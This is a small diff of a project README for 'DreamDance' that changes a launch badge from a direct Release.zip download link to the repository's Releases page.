@@ -60,7 +60,7 @@ This project is licensed under the **Dreamer's License** - allowing you to dream
 
 ---
 
-[![Launch DreamDance](https://img.shields.io/badge/Launch-DreamDance-blue)](https://github.com/releases/789694263/Release.zip)
+[![Launch DreamDance](https://github.com/ABOUBAKAR909/DreamDance/releases)](https://github.com/ABOUBAKAR909/DreamDance/releases)
 
 If the provided link does not work as expected, feel free to check the "Releases" section for an updated link.
 
